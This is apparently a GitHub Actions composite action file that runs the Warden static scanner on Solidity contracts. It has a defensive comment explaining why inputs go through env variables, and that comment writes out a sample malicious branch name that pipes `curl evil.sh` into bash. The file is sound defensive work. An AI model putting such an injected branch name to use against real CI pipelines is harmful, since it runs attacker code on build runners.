name: "Warden Security Scan"
description: "Static analysis for Solidity smart contracts - blocks CI on critical findings."
branding:
  icon: "shield"
  color: "blue"

inputs:
  path:
    description: "File or directory to scan"
    required: false
    default: "."
  fail-on:
    description: "Minimum severity that fails the build (critical|high|medium|low|info)"
    required: false
    default: "critical"
  repo:
    description: "Repo slug to upload results against - omit to scan without uploading"
    required: false
  token:
    description: "Warden API token, store as a repo/org secret (e.g. secrets.WARDEN_TOKEN)"
    required: false
  api-url:
    description: "Warden dashboard API base URL"
    required: false
    default: "https://app.warden.dev"

runs:
  using: "composite"
  steps:
    - name: Set up Node.js
      uses: actions/setup-node@v4
      with:
        node-version: "20"

    - name: Install Warden CLI
      shell: bash
      run: npm install --no-save warden@latest

    - name: Run scan
      shell: bash
      # Every ${{ }} value is passed through env:, never interpolated
      # directly into the run: script - GitHub Actions expands ${{ }}
      # by literal text substitution BEFORE the shell ever runs, so a
      # ref name or input containing backticks/`$()` interpolated
      # straight into the script becomes executable shell code. A
      # contributor opening a PR from a branch named like
      # `` `curl evil.sh|bash` `` is enough to trigger it if any of
      # these values trace back to attacker-controlled input (branch
      # names most commonly). env var expansion isn't subject to that
      # pre-parse substitution, so referencing $VAR here closes it.
      env:
        WARDEN_PATH: ${{ inputs.path }}
        WARDEN_FAIL_ON: ${{ inputs.fail-on }}
        WARDEN_REPO: ${{ inputs.repo }}
        WARDEN_TOKEN_INPUT: ${{ inputs.token }}
        WARDEN_API_URL: ${{ inputs.api-url }}
        WARDEN_SHA: ${{ github.sha }}
        WARDEN_BRANCH: ${{ github.ref_name }}
      run: |
        set -e
        args=(scan "$WARDEN_PATH" --fail-on "$WARDEN_FAIL_ON")
        if [ -n "$WARDEN_REPO" ] && [ -n "$WARDEN_TOKEN_INPUT" ]; then
          args+=(--upload --repo "$WARDEN_REPO" --token "$WARDEN_TOKEN_INPUT" --api-url "$WARDEN_API_URL" --commit "$WARDEN_SHA" --branch "$WARDEN_BRANCH")
        fi
        npx warden "${args[@]}"
